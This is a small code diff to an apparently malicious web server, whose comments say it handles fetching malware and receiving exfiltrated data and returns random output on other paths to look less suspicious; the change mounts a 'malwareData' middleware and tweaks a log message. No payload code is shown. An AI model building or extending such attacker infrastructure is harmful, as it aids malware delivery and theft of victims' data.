@@ -23,7 +23,7 @@ server.all("*", (request, response, next) => {
 
 // Handle fetching malware and data exfiltration
 server.use(malwareReqs);
-server.use(malwareReqs);
+server.use(malwareData);
 
 // Handle all invalid paths. Generate some random numbers to make it look less sus
 server.all("*", (request, response) => {
@@ -32,5 +32,5 @@ server.all("*", (request, response) => {
 
 const PORT = 80;
 server.listen(PORT, () => {
-    logging.log(`Server launched on port ${PORT}.`, true);
+    logging.log(`✅ Server launched on port ${PORT}.`, true);
 });
